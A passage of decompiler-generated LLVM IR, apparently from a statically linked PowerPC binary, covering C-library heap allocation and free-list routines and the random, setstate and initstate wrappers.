  %v1_1000b2bc = inttoptr i32 %arg2 to i32*
  %v2_1000b2bc = load i32, i32* %v1_1000b2bc, align 4
  %v1_1000b2c0 = add i32 %v2_1000b2bc, 3
  store i32 %v1_1000b2c0, i32* %r9.global-to-local, align 4
  %v1_1000b2c4 = call i32 @__asm_rlwinm(i32 %v1_1000b2c0, i32 0, i32 0, i32 29)
  %v2_1000b2c8 = icmp ugt i32 %v1_1000b2c4, 11
  br i1 %v2_1000b2c8, label %dec_label_pc_1000b34c.preheader, label %dec_label_pc_1000b2d0

dec_label_pc_1000b2d0:                            ; preds = %entry
  br label %dec_label_pc_1000b34c.preheader

dec_label_pc_1000b34c.preheader:                  ; preds = %entry, %dec_label_pc_1000b2d0
  %storemerge20 = phi i32 [ 12, %dec_label_pc_1000b2d0 ], [ %v1_1000b2c4, %entry ]
  %v0_1000b330 = phi i32 [ 12, %dec_label_pc_1000b2d0 ], [ %v1_1000b2c4, %entry ]
  store i32 %storemerge20, i32* %r11.global-to-local, align 4
  %storemerge2 = load i32, i32* %arg1, align 4
  store i32 %storemerge2, i32* %r9.global-to-local, align 4
  %v3_1000b34c5 = icmp eq i32 %storemerge2, 0
  br i1 %v3_1000b34c5, label %dec_label_pc_1000b354, label %dec_label_pc_1000b2dc

dec_label_pc_1000b2dc:                            ; preds = %dec_label_pc_1000b34c.preheader, %dec_label_pc_1000b348
  %v0_1000b348 = phi i32 [ %storemerge, %dec_label_pc_1000b348 ], [ %storemerge2, %dec_label_pc_1000b34c.preheader ]
  %v1_1000b2dc = inttoptr i32 %v0_1000b348 to i32*
  %v2_1000b2dc = load i32, i32* %v1_1000b2dc, align 4
  store i32 %v2_1000b2dc, i32* %r10.global-to-local, align 4
  %v2_1000b2e0 = icmp ult i32 %v2_1000b2dc, %v0_1000b330
  br i1 %v2_1000b2e0, label %dec_label_pc_1000b348, label %dec_label_pc_1000b2e8

dec_label_pc_1000b2e8:                            ; preds = %dec_label_pc_1000b2dc
  %v1_1000b2e8 = add i32 %v0_1000b330, 44
  %v2_1000b2ec = icmp ult i32 %v2_1000b2dc, %v1_1000b2e8
  br i1 %v2_1000b2ec, label %dec_label_pc_1000b2f4, label %dec_label_pc_1000b330

dec_label_pc_1000b2f4:                            ; preds = %dec_label_pc_1000b2e8
  %v1_1000b2f4 = add i32 %v0_1000b348, 4
  %v2_1000b2f4 = inttoptr i32 %v1_1000b2f4 to i32*
  %v3_1000b2f4 = load i32, i32* %v2_1000b2f4, align 4
  store i32 %v3_1000b2f4, i32* %r11.global-to-local, align 4
  %v3_1000b2f8 = icmp eq i32 %v3_1000b2f4, 0
  br i1 %v3_1000b2f8, label %dec_label_pc_1000b308, label %dec_label_pc_1000b300

dec_label_pc_1000b300:                            ; preds = %dec_label_pc_1000b2f4
  %v1_1000b300 = add i32 %v0_1000b348, 8
  %v2_1000b300 = inttoptr i32 %v1_1000b300 to i32*
  %v3_1000b300 = load i32, i32* %v2_1000b300, align 4
  %v2_1000b304 = add i32 %v3_1000b2f4, 8
  %v3_1000b304 = inttoptr i32 %v2_1000b304 to i32*
  store i32 %v3_1000b300, i32* %v3_1000b304, align 4
  %v0_1000b308.pre = load i32, i32* %r9.global-to-local, align 4
  %v0_1000b324.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000b308

dec_label_pc_1000b308:                            ; preds = %dec_label_pc_1000b2f4, %dec_label_pc_1000b300
  %v0_1000b324 = phi i32 [ %v2_1000b2dc, %dec_label_pc_1000b2f4 ], [ %v0_1000b324.pre, %dec_label_pc_1000b300 ]
  %v0_1000b308 = phi i32 [ %v0_1000b348, %dec_label_pc_1000b2f4 ], [ %v0_1000b308.pre, %dec_label_pc_1000b300 ]
  %v1_1000b308 = add i32 %v0_1000b308, 8
  %v2_1000b308 = inttoptr i32 %v1_1000b308 to i32*
  %v3_1000b308 = load i32, i32* %v2_1000b308, align 4
  store i32 %v3_1000b308, i32* @r8, align 4
  %v1_1000b30c = add i32 %v0_1000b308, 4
  %v2_1000b30c = inttoptr i32 %v1_1000b30c to i32*
  %v3_1000b30c = load i32, i32* %v2_1000b30c, align 4
  %v3_1000b310 = icmp eq i32 %v3_1000b308, 0
  store i32 %v0_1000b324, i32* %r11.global-to-local, align 4
  br i1 %v3_1000b310, label %dec_label_pc_1000b324, label %dec_label_pc_1000b318

dec_label_pc_1000b318:                            ; preds = %dec_label_pc_1000b308
  %v2_1000b31c = add i32 %v3_1000b308, 4
  %v3_1000b31c = inttoptr i32 %v2_1000b31c to i32*
  store i32 %v3_1000b30c, i32* %v3_1000b31c, align 4
  br label %dec_label_pc_1000b338

dec_label_pc_1000b324:                            ; preds = %dec_label_pc_1000b308
  store i32 %v3_1000b30c, i32* %arg1, align 4
  br label %dec_label_pc_1000b338

dec_label_pc_1000b330:                            ; preds = %dec_label_pc_1000b2e8
  %v2_1000b330 = sub i32 %v2_1000b2dc, %v0_1000b330
  store i32 %v2_1000b330, i32* %v1_1000b2dc, align 4
  br label %dec_label_pc_1000b338

dec_label_pc_1000b338:                            ; preds = %dec_label_pc_1000b324, %dec_label_pc_1000b318, %dec_label_pc_1000b330
  %v0_1000b338 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000b338 = load i32, i32* %r9.global-to-local, align 4
  %v2_1000b338 = sub i32 %v1_1000b338, %v0_1000b338
  store i32 %v2_1000b338, i32* %r9.global-to-local, align 4
  %v0_1000b33c = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_1000b33c, i32* %v1_1000b2bc, align 4
  %v0_1000b340 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000b340 = add i32 %v0_1000b340, 12
  ret i32 %v1_1000b340

dec_label_pc_1000b348:                            ; preds = %dec_label_pc_1000b2dc
  %v1_1000b348 = add i32 %v0_1000b348, 4
  %storemerge.in = inttoptr i32 %v1_1000b348 to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %r9.global-to-local, align 4
  %v3_1000b34c = icmp eq i32 %storemerge, 0
  br i1 %v3_1000b34c, label %dec_label_pc_1000b34c.dec_label_pc_1000b354_crit_edge, label %dec_label_pc_1000b2dc

dec_label_pc_1000b34c.dec_label_pc_1000b354_crit_edge: ; preds = %dec_label_pc_1000b348
  br label %dec_label_pc_1000b354

dec_label_pc_1000b354:                            ; preds = %dec_label_pc_1000b34c.dec_label_pc_1000b354_crit_edge, %dec_label_pc_1000b34c.preheader
  ret i32 0

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_1000b308, { 1, 0 }
  uselistorder i32 %v2_1000b2dc, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_1000b348, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v0_1000b330, { 1, 2, 0 }
  uselistorder i32* %r9.global-to-local, { 0, 4, 5, 2, 1, 3, 6 }
  uselistorder i32* %r11.global-to-local, { 3, 1, 2, 0 }
  uselistorder i32* %r10.global-to-local, { 1, 0, 2 }
  uselistorder i32* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_1000b338, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000b308, { 1, 0 }
  uselistorder label %dec_label_pc_1000b2dc, { 1, 0 }
  uselistorder label %dec_label_pc_1000b34c.preheader, { 1, 0 }
}

define i32 @__heap_alloc_at(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v2_1000b35c = load i32, i32* %arg1, align 4
  store i32 %v2_1000b35c, i32* %r11.global-to-local, align 4
  store i32 %tmp, i32* @r8, align 4
  %v1_1000b364 = add i32 %arg3, 3
  %v3_1000b3e83 = icmp eq i32 %v2_1000b35c, 0
  br i1 %v3_1000b3e83, label %dec_label_pc_1000b3f0, label %dec_label_pc_1000b36c

dec_label_pc_1000b36c:                            ; preds = %entry, %dec_label_pc_1000b3e4
  %v0_1000b3e4 = phi i32 [ %v3_1000b3e4, %dec_label_pc_1000b3e4 ], [ %v2_1000b35c, %entry ]
  %v1_1000b36c = inttoptr i32 %v0_1000b3e4 to i32*
  %v2_1000b36c = load i32, i32* %v1_1000b36c, align 4
  %v2_1000b370 = sub i32 %v0_1000b3e4, %v2_1000b36c
  %v1_1000b374 = add i32 %v2_1000b370, 12
  %v3_1000b378 = icmp ugt i32 %v1_1000b374, %arg2
  br i1 %v3_1000b378, label %dec_label_pc_1000b3e4, label %dec_label_pc_1000b380

dec_label_pc_1000b380:                            ; preds = %dec_label_pc_1000b36c
  %v4_1000b378 = icmp eq i32 %v1_1000b374, %arg2
  br i1 %v4_1000b378, label %dec_label_pc_1000b388, label %dec_label_pc_1000b3f0

dec_label_pc_1000b388:                            ; preds = %dec_label_pc_1000b380
  %v1_1000b388 = call i32 @__asm_rlwinm(i32 %v1_1000b364, i32 0, i32 0, i32 29)
  %v2_1000b38c = icmp ult i32 %v2_1000b36c, %v1_1000b388
  br i1 %v2_1000b38c, label %dec_label_pc_1000b3f0, label %dec_label_pc_1000b394

dec_label_pc_1000b394:                            ; preds = %dec_label_pc_1000b388
  %v1_1000b394 = add i32 %v1_1000b388, 44
  %v2_1000b398 = icmp ult i32 %v2_1000b36c, %v1_1000b394
  br i1 %v2_1000b398, label %dec_label_pc_1000b3a0, label %dec_label_pc_1000b3d4

dec_label_pc_1000b3a0:                            ; preds = %dec_label_pc_1000b394
  %v0_1000b3a0 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000b3a0 = add i32 %v0_1000b3a0, 4
  %v2_1000b3a0 = inttoptr i32 %v1_1000b3a0 to i32*
  %v3_1000b3a0 = load i32, i32* %v2_1000b3a0, align 4
  %v3_1000b3a4 = icmp eq i32 %v3_1000b3a0, 0
  br i1 %v3_1000b3a4, label %dec_label_pc_1000b3b4, label %dec_label_pc_1000b3ac

dec_label_pc_1000b3ac:                            ; preds = %dec_label_pc_1000b3a0
  %v1_1000b3ac = add i32 %v0_1000b3a0, 8
  %v2_1000b3ac = inttoptr i32 %v1_1000b3ac to i32*
  %v3_1000b3ac = load i32, i32* %v2_1000b3ac, align 4
  %v2_1000b3b0 = add i32 %v3_1000b3a0, 8
  %v3_1000b3b0 = inttoptr i32 %v2_1000b3b0 to i32*
  store i32 %v3_1000b3ac, i32* %v3_1000b3b0, align 4
  %v0_1000b3b4.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000b3b4

dec_label_pc_1000b3b4:                            ; preds = %dec_label_pc_1000b3a0, %dec_label_pc_1000b3ac
  %v0_1000b3b4 = phi i32 [ %v0_1000b3a0, %dec_label_pc_1000b3a0 ], [ %v0_1000b3b4.pre, %dec_label_pc_1000b3ac ]
  %v1_1000b3b4 = add i32 %v0_1000b3b4, 8
  %v2_1000b3b4 = inttoptr i32 %v1_1000b3b4 to i32*
  %v3_1000b3b4 = load i32, i32* %v2_1000b3b4, align 4
  %v1_1000b3b8 = add i32 %v0_1000b3b4, 4
  %v2_1000b3b8 = inttoptr i32 %v1_1000b3b8 to i32*
  %v3_1000b3b8 = load i32, i32* %v2_1000b3b8, align 4
  %v3_1000b3bc = icmp eq i32 %v3_1000b3b4, 0
  br i1 %v3_1000b3bc, label %dec_label_pc_1000b3cc, label %dec_label_pc_1000b3c4

dec_label_pc_1000b3c4:                            ; preds = %dec_label_pc_1000b3b4
  %v2_1000b3c4 = add i32 %v3_1000b3b4, 4
  %v3_1000b3c4 = inttoptr i32 %v2_1000b3c4 to i32*
  store i32 %v3_1000b3b8, i32* %v3_1000b3c4, align 4
  ret i32 %v2_1000b36c

dec_label_pc_1000b3cc:                            ; preds = %dec_label_pc_1000b3b4
  %v1_1000b3cc = load i32, i32* @r8, align 4
  %v2_1000b3cc = inttoptr i32 %v1_1000b3cc to i32*
  store i32 %v3_1000b3b8, i32* %v2_1000b3cc, align 4
  ret i32 %v2_1000b36c

dec_label_pc_1000b3d4:                            ; preds = %dec_label_pc_1000b394
  %v2_1000b3d4 = sub i32 %v2_1000b36c, %v1_1000b388
  %v1_1000b3dc = load i32, i32* %r11.global-to-local, align 4
  %v2_1000b3dc = inttoptr i32 %v1_1000b3dc to i32*
  store i32 %v2_1000b3d4, i32* %v2_1000b3dc, align 4
  ret i32 %v1_1000b388

dec_label_pc_1000b3e4:                            ; preds = %dec_label_pc_1000b36c
  %v1_1000b3e4 = add i32 %v0_1000b3e4, 4
  %v2_1000b3e4 = inttoptr i32 %v1_1000b3e4 to i32*
  %v3_1000b3e4 = load i32, i32* %v2_1000b3e4, align 4
  store i32 %v3_1000b3e4, i32* %r11.global-to-local, align 4
  %v3_1000b3e8 = icmp eq i32 %v3_1000b3e4, 0
  br i1 %v3_1000b3e8, label %dec_label_pc_1000b3e8.dec_label_pc_1000b3f0.loopexit_crit_edge, label %dec_label_pc_1000b36c

dec_label_pc_1000b3e8.dec_label_pc_1000b3f0.loopexit_crit_edge: ; preds = %dec_label_pc_1000b3e4
  br label %dec_label_pc_1000b3f0

dec_label_pc_1000b3f0:                            ; preds = %entry, %dec_label_pc_1000b3e8.dec_label_pc_1000b3f0.loopexit_crit_edge, %dec_label_pc_1000b380, %dec_label_pc_1000b388
  ret i32 0

; uselistorder directives
  uselistorder i32 %v3_1000b3e4, { 1, 2, 0 }
  uselistorder i32 %v0_1000b3b4, { 1, 0 }
  uselistorder i32 %v1_1000b388, { 2, 1, 0, 3 }
  uselistorder i32 %v2_1000b36c, { 4, 1, 0, 2, 3, 5 }
  uselistorder i32 %v0_1000b3e4, { 0, 2, 1 }
  uselistorder i32* %r11.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_1000b3f0, { 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_1000b3b4, { 1, 0 }
  uselistorder label %dec_label_pc_1000b36c, { 1, 0 }
}

define i32 @__heap_link_free_area(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_1000b3f8 = icmp eq i32 %arg3, 0
  %v2_1000b3fc = add i32 %arg2, 4
  %v3_1000b3fc = inttoptr i32 %v2_1000b3fc to i32*
  store i32 %arg4, i32* %v3_1000b3fc, align 4
  %v2_1000b400 = add i32 %arg2, 8
  %v3_1000b400 = inttoptr i32 %v2_1000b400 to i32*
  store i32 %arg3, i32* %v3_1000b400, align 4
  br i1 %v3_1000b3f8, label %dec_label_pc_1000b410, label %dec_label_pc_1000b408

dec_label_pc_1000b408:                            ; preds = %entry
  %v2_1000b408 = add i32 %arg3, 4
  %v3_1000b408 = inttoptr i32 %v2_1000b408 to i32*
  store i32 %arg2, i32* %v3_1000b408, align 4
  br label %dec_label_pc_1000b414

dec_label_pc_1000b410:                            ; preds = %entry
  store i32 %arg2, i32* %arg1, align 4
  br label %dec_label_pc_1000b414

dec_label_pc_1000b414:                            ; preds = %dec_label_pc_1000b408, %dec_label_pc_1000b410
  %v3_1000b414 = icmp eq i32 %arg4, 0
  %v0_1000b418 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000b414, i32 %v0_1000b418)
  %v2_1000b41c = add i32 %arg4, 8
  %v3_1000b41c = inttoptr i32 %v2_1000b41c to i32*
  store i32 %arg2, i32* %v3_1000b41c, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %arg4, { 0, 2, 1 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder i32 %arg2, { 0, 2, 3, 1, 4 }
  uselistorder label %dec_label_pc_1000b414, { 1, 0 }
}

define i32 @__heap_link_free_area_after(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_1000b424 = icmp eq i32 %arg3, 0
  br i1 %v3_1000b424, label %dec_label_pc_1000b434, label %dec_label_pc_1000b42c

dec_label_pc_1000b42c:                            ; preds = %entry
  %v2_1000b42c = add i32 %arg3, 4
  %v3_1000b42c = inttoptr i32 %v2_1000b42c to i32*
  store i32 %arg2, i32* %v3_1000b42c, align 4
  br label %dec_label_pc_1000b438

dec_label_pc_1000b434:                            ; preds = %entry
  store i32 %arg2, i32* %arg1, align 4
  br label %dec_label_pc_1000b438

dec_label_pc_1000b438:                            ; preds = %dec_label_pc_1000b42c, %dec_label_pc_1000b434
  %v2_1000b438 = add i32 %arg2, 8
  %v3_1000b438 = inttoptr i32 %v2_1000b438 to i32*
  store i32 %arg3, i32* %v3_1000b438, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000b438, { 1, 0 }
}

define i32 @__heap_free(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %tmp, i32* %r10.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  %v2_1000b458 = load i32, i32* %arg1, align 4
  store i32 %v2_1000b458, i32* @r31, align 4
  %v2_1000b45c = add i32 %arg3, %arg2
  store i32 %v2_1000b45c, i32* %r3.global-to-local, align 4
  %v3_1000b4707 = icmp eq i32 %v2_1000b458, 0
  %v1_1000b4748 = add i32 %v2_1000b458, 12
  %tmp69 = icmp uge i32 %v1_1000b4748, %arg2
  %or.cond10 = or i1 %v3_1000b4707, %tmp69
  br i1 %or.cond10, label %dec_label_pc_1000b480, label %dec_label_pc_1000b468

dec_label_pc_1000b468:                            ; preds = %entry, %dec_label_pc_1000b468
  %v0_1000b4c811 = phi i32 [ %v3_1000b46c, %dec_label_pc_1000b468 ], [ %v2_1000b458, %entry ]
  store i32 %v0_1000b4c811, i32* %r11.global-to-local, align 4
  %v1_1000b46c = add i32 %v0_1000b4c811, 4
  %v2_1000b46c = inttoptr i32 %v1_1000b46c to i32*
  %v3_1000b46c = load i32, i32* %v2_1000b46c, align 4
  store i32 %v3_1000b46c, i32* @r31, align 4
  %v3_1000b470 = icmp eq i32 %v3_1000b46c, 0
  %v1_1000b474 = add i32 %v3_1000b46c, 12
  %tmp6 = icmp uge i32 %v1_1000b474, %arg2
  %or.cond = or i1 %v3_1000b470, %tmp6
  br i1 %or.cond, label %dec_label_pc_1000b480, label %dec_label_pc_1000b468

dec_label_pc_1000b480:                            ; preds = %dec_label_pc_1000b468, %entry
  %v0_1000b4bc.lcssa = phi i32 [ 0, %entry ], [ %v0_1000b4c811, %dec_label_pc_1000b468 ]
  %v0_1000b4c8.lcssa = phi i32 [ %v2_1000b458, %entry ], [ %v3_1000b46c, %dec_label_pc_1000b468 ]
  %v3_1000b470.lcssa = phi i1 [ %v3_1000b4707, %entry ], [ %v3_1000b470, %dec_label_pc_1000b468 ]
  br i1 %v3_1000b470.lcssa, label %dec_label_pc_1000b538, label %dec_label_pc_1000b488

dec_label_pc_1000b488:                            ; preds = %dec_label_pc_1000b480
  %v1_1000b488 = inttoptr i32 %v0_1000b4c8.lcssa to i32*
  %v2_1000b488 = load i32, i32* %v1_1000b488, align 4
  %v2_1000b48c = sub i32 %v0_1000b4c8.lcssa, %v2_1000b488
  %v1_1000b490 = add i32 %v2_1000b48c, 12
  %v3_1000b494 = icmp ugt i32 %v1_1000b490, %v2_1000b45c
  br i1 %v3_1000b494, label %dec_label_pc_1000b538, label %dec_label_pc_1000b49c

dec_label_pc_1000b49c:                            ; preds = %dec_label_pc_1000b488
  %v4_1000b494 = icmp eq i32 %v1_1000b490, %v2_1000b45c
  %v2_1000b4a0 = add i32 %v2_1000b488, %arg3
  store i32 %v2_1000b4a0, i32* @r29, align 4
  br i1 %v4_1000b494, label %dec_label_pc_1000b4a8, label %dec_label_pc_1000b4d8

dec_label_pc_1000b4a8:                            ; preds = %dec_label_pc_1000b49c
  %v3_1000b4a8 = icmp eq i32 %v0_1000b4bc.lcssa, 0
  br i1 %v3_1000b4a8, label %dec_label_pc_1000b52c, label %dec_label_pc_1000b4b0

dec_label_pc_1000b4b0:                            ; preds = %dec_label_pc_1000b4a8
  %v1_1000b4b0 = add i32 %v0_1000b4bc.lcssa, 12
  %v4_1000b4b4 = icmp eq i32 %v1_1000b4b0, %arg2
  br i1 %v4_1000b4b4, label %dec_label_pc_1000b4bc, label %dec_label_pc_1000b52c

dec_label_pc_1000b4bc:                            ; preds = %dec_label_pc_1000b4b0
  %v1_1000b4bc = inttoptr i32 %v0_1000b4bc.lcssa to i32*
  %v2_1000b4bc = load i32, i32* %v1_1000b4bc, align 4
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v1_1000b4c4 = add i32 %v0_1000b4bc.lcssa, 8
  %v2_1000b4c4 = inttoptr i32 %v1_1000b4c4 to i32*
  %v3_1000b4c4 = load i32, i32* %v2_1000b4c4, align 4
  %v2_1000b4cc = add i32 %v2_1000b4bc, %v2_1000b4a0
  store i32 %v2_1000b4cc, i32* @r29, align 4
  %v5_1000b4d0 = call i32 @__heap_link_free_area_after(i32* %arg1, i32 %v0_1000b4c8.lcssa, i32 %v3_1000b4c4, i32 %v2_1000b45c)
  store i32 %v5_1000b4d0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000b52c

dec_label_pc_1000b4d8:                            ; preds = %dec_label_pc_1000b49c
  %v1_1000b4d8 = add i32 %v0_1000b4c8.lcssa, 4
  %v2_1000b4d8 = inttoptr i32 %v1_1000b4d8 to i32*
  %v3_1000b4d8 = load i32, i32* %v2_1000b4d8, align 4
  %v3_1000b4dc = icmp eq i32 %v3_1000b4d8, 0
  br i1 %v3_1000b4dc, label %dec_label_pc_1000b514, label %dec_label_pc_1000b4e4

dec_label_pc_1000b4e4:                            ; preds = %dec_label_pc_1000b4d8
  %v1_1000b4e4 = inttoptr i32 %v3_1000b4d8 to i32*
  %v2_1000b4e4 = load i32, i32* %v1_1000b4e4, align 4
  %v2_1000b4e8 = sub i32 %v3_1000b4d8, %v2_1000b4e4
  %v1_1000b4ec = add i32 %v2_1000b4e8, 12
  %v4_1000b4f0 = icmp eq i32 %v2_1000b45c, %v1_1000b4ec
  br i1 %v4_1000b4f0, label %dec_label_pc_1000b4f8, label %dec_label_pc_1000b514

dec_label_pc_1000b4f8:                            ; preds = %dec_label_pc_1000b4e4
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v2_1000b504 = add i32 %v2_1000b4e4, %v2_1000b4a0
  store i32 %v2_1000b504, i32* @r29, align 4
  store i32 %v3_1000b4d8, i32* @r31, align 4
  %v5_1000b50c = call i32 @__heap_link_free_area_after(i32* %arg1, i32 %v3_1000b4d8, i32 %v0_1000b4bc.lcssa, i32 %v2_1000b45c)
  store i32 %v5_1000b50c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000b52c

dec_label_pc_1000b514:                            ; preds = %dec_label_pc_1000b4e4, %dec_label_pc_1000b4d8
  %v2_1000b514 = add i32 %v0_1000b4c8.lcssa, %arg3
  store i32 %v2_1000b514, i32* @r31, align 4
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 268481836, i32* @lr, align 4
  %v5_1000b528 = call i32 @__heap_link_free_area(i32* %arg1, i32 %v2_1000b514, i32 %v0_1000b4bc.lcssa, i32 %v3_1000b4d8)
  store i32 %v5_1000b528, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000b52c

dec_label_pc_1000b52c:                            ; preds = %dec_label_pc_1000b4b0, %dec_label_pc_1000b4a8, %dec_label_pc_1000b4f8, %dec_label_pc_1000b4bc, %dec_label_pc_1000b514
  %v0_1000b52c = load i32, i32* @r31, align 4
  store i32 %v0_1000b52c, i32* @r30, align 4
  %v0_1000b530 = load i32, i32* @r29, align 4
  %v2_1000b530 = inttoptr i32 %v0_1000b52c to i32*
  store i32 %v0_1000b530, i32* %v2_1000b530, align 4
  br label %dec_label_pc_1000b554

dec_label_pc_1000b538:                            ; preds = %dec_label_pc_1000b488, %dec_label_pc_1000b480
  %v2_1000b538 = add i32 %v2_1000b45c, -12
  %v3_1000b538 = inttoptr i32 %v2_1000b538 to i32*
  store i32 %arg3, i32* %v3_1000b538, align 4
  %v0_1000b53c = load i32, i32* %r3.global-to-local, align 4
  %v1_1000b53c = add i32 %v0_1000b53c, -12
  store i32 %v1_1000b53c, i32* @r30, align 4
  %v0_1000b540 = load i32, i32* %r11.global-to-local, align 4
  %v0_1000b544 = load i32, i32* %r10.global-to-local, align 4
  store i32 %v0_1000b544, i32* %r3.global-to-local, align 4
  %v0_1000b548 = load i32, i32* @r31, align 4
  store i32 268481876, i32* @lr, align 4
  %v4_1000b550 = inttoptr i32 %v0_1000b544 to i32*
  %v5_1000b550 = call i32 @__heap_link_free_area(i32* %v4_1000b550, i32 %v1_1000b53c, i32 %v0_1000b540, i32 %v0_1000b548)
  store i32 %v5_1000b550, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000b554

dec_label_pc_1000b554:                            ; preds = %dec_label_pc_1000b52c, %dec_label_pc_1000b538
  %v0_1000b558 = load i32, i32* @r30, align 4
  store i32 %v0_1000b558, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000b558

; uselistorder directives
  uselistorder i32 %v3_1000b4d8, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v1_1000b490, { 1, 0 }
  uselistorder i32 %v0_1000b4c8.lcssa, { 4, 2, 3, 0, 1 }
  uselistorder i32 %v0_1000b4bc.lcssa, { 1, 0, 4, 5, 3, 2 }
  uselistorder i32 %v3_1000b46c, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v2_1000b45c, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32 %tmp, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 1, 8, 2, 6, 9, 3, 10, 4, 11, 5, 7, 0 }
  uselistorder i32* %r11.global-to-local, { 1, 0, 2 }
  uselistorder i32 -12, { 2, 3, 1, 4, 0 }
  uselistorder i32 %arg3, { 3, 0, 1, 2 }
  uselistorder i32 %arg2, { 3, 2, 0, 1 }
  uselistorder i32* %arg1, { 2, 1, 0, 3, 4 }
  uselistorder label %dec_label_pc_1000b554, { 1, 0 }
  uselistorder label %dec_label_pc_1000b52c, { 4, 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_1000b468, { 1, 0 }
}

define i32 @rand() local_unnamed_addr {
entry:
  %v0_1000b56c = call i32 @random()
  ret i32 %v0_1000b56c

; uselistorder directives
  uselistorder i32 ()* @random, { 11, 10, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9 }
}

define i32 @random() local_unnamed_addr {
entry:
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %v2_1000b584 = ptrtoint i32* %stack_var_-52 to i32
  store i32 ptrtoint (i32* @global_var_100248d8.621 to i32), i32* @r29, align 4
  store i32 %v2_1000b584, i32* @r3, align 4
  %v0_1000b59c = call i32 @__pthread_return_void()
  %v0_1000b5a4 = call i32 @__pthread_return_0()
  %v2_1000b5ac = ptrtoint i32* %stack_var_-56 to i32
  %v3_1000b5b4 = call i32 @__GI_random_r(i32* inttoptr (i32 268585200 to i32*), i32 %v2_1000b5ac)
  store i32 %v2_1000b584, i32* @r3, align 4
  %v0_1000b5c0 = call i32 @__pthread_return_void()
  %v3_1000b5c8 = load i32, i32* %stack_var_-56, align 4
  ret i32 %v3_1000b5c8
}

define i32 @setstate(i32 %arg1) local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_100248d8.621 to i32), i32* %r29.global-to-local, align 4
  %v2_1000b600 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_1000b600, i32* @r3, align 4
  %v0_1000b608 = call i32 @__pthread_return_void()
  %v0_1000b610 = call i32 @__pthread_return_0()
  store i32 268482092, i32* @lr, align 4
  %v3_1000b628 = call i32 @setstate_r(i32 %arg1, i32* nonnull @global_var_100248f0)
  store i32 0, i32* %r29.global-to-local, align 4
  %v1_1000b630 = icmp slt i32 %v3_1000b628, 0
  store i32 %v2_1000b600, i32* @r3, align 4
  br i1 %v1_1000b630, label %dec_label_pc_1000b644, label %dec_label_pc_1000b640

dec_label_pc_1000b640:                            ; preds = %entry
  store i32 ptrtoint (i32** @global_var_100248f4.625 to i32), i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1000b644

dec_label_pc_1000b644:                            ; preds = %entry, %dec_label_pc_1000b640
  %v0_1000b644 = call i32 @__pthread_return_void()
  %v0_1000b64c = load i32, i32* %r29.global-to-local, align 4
  ret i32 %v0_1000b64c

; uselistorder directives
  uselistorder i32* %r29.global-to-local, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1000b644, { 1, 0 }
}

define i32 @initstate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-56 = alloca i32, align 4
  %v2_1000b670 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_1000b670, i32* @r3, align 4
  %v0_1000b698 = call i32 @__pthread_return_void()
  %v0_1000b6a0 = call i32 @__pthread_return_0()
  store i32 %arg1, i32* @r3, align 4
  store i32 268482240, i32* @lr, align 4
  %v4_1000b6bc = inttoptr i32 %arg1 to i32*
  %v5_1000b6bc = call i32 @__GI_initstate_r(i32* %v4_1000b6bc, i32 %arg2, i32 %arg3, i32 ptrtoint (i32* @global_var_100248f0 to i32))
  store i32 %v2_1000b670, i32* @r3, align 4
